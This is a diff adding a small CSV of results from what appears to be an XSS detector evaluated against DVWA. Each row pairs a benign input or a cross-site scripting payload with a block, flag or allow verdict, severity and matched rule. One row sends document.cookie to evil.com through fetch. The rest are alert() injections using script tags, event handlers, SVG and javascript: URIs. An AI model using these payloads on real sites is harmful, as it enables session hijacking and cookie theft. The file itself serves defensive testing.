@@ -1,0 +1,10 @@
+label,payload,verdict,attack_type,severity,reason,anomaly_score,dvwa_reflected_raw
+normal,Rahul Kumar,ALLOW,,,clean,+0.117,yes
+normal,Meeting at 5pm with the team,ALLOW,,,clean,+0.152,yes
+script_tag,<script>alert(1)</script>,BLOCK,Script tag injection,Medium,rule:script_tag,-0.008,yes
+event_handler,<img src=x onerror=alert(1)>,BLOCK,Event handler injection,Medium,"rule:event_handler,svg_or_img_vector",+0.000,yes
+svg,<svg onload=alert(1)>,BLOCK,Event handler injection,Medium,"rule:event_handler,svg_or_img_vector",-0.007,yes
+exfil,<script>fetch('http://evil.com/?c='+document.cookie)</script>,BLOCK,"Script execution / data access (eval, cookie, fetch)",High,"rule:script_tag,eval_or_document",-0.068,yes
+js_uri,"<a href=""javascript:alert(1)"">click</a>",BLOCK,javascript: URI injection,Medium,rule:javascript_uri,-0.037,yes
+rare_handler,<div onclick=alert(1)>click,FLAG,Unclassified (statistical anomaly),Low,anomaly_only,-0.008,yes
+no_rule,"';alert(String.fromCharCode(88,83,83))//",FLAG,Unclassified (statistical anomaly),Medium,anomaly_only,-0.044,yes
